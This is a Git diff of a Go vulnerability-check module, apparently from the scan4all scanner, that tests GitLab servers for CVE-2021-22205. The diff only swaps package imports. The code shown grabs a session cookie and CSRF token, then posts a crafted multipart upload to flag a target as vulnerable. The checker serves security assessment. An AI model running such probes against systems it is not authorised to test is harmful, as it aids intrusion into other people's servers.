@@ -3,14 +3,14 @@ package gitlab
 import (
 	"bytes"
 	"fmt"
-	"github.com/hktalent/scan4all/pkg"
+	"github.com/hktalent/scan4all/lib/util"
 	"mime/multipart"
 	"net/textproto"
 	"regexp"
 )
 
 func CVE_2021_22205(url string) bool {
-	if req, err := pkg.HttpRequset(url+"/users/sign_in", "GET", "", false, nil); err == nil {
+	if req, err := util.HttpRequset(url+"/users/sign_in", "GET", "", false, nil); err == nil {
 		if req.StatusCode == 200 {
 			var cookie string
 			var csrf string
@@ -55,9 +55,9 @@ func upload(u string, cookie string, csrf string) bool {
 	header["Content-Type"] = "multipart/form-data; boundary=" + boundary
 	header["Cookie"] = cookie
 	header["X-CSRF-Token"] = csrf
-	if req, err := pkg.HttpRequset(u+"/uploads/user", "POST", buf.String(), false, header); err == nil {
-		if pkg.StrContains(req.Body, "Failed to process image") {
-			pkg.GoPocLog(fmt.Sprintf("Found vuln gitlab CVE_2021_22205|%s\n", u))
+	if req, err := util.HttpRequset(u+"/uploads/user", "POST", buf.String(), false, header); err == nil {
+		if util.StrContains(req.Body, "Failed to process image") {
+			util.GoPocLog(fmt.Sprintf("Found vuln gitlab CVE_2021_22205|%s\n", u))
 			return true
 		}
 	}
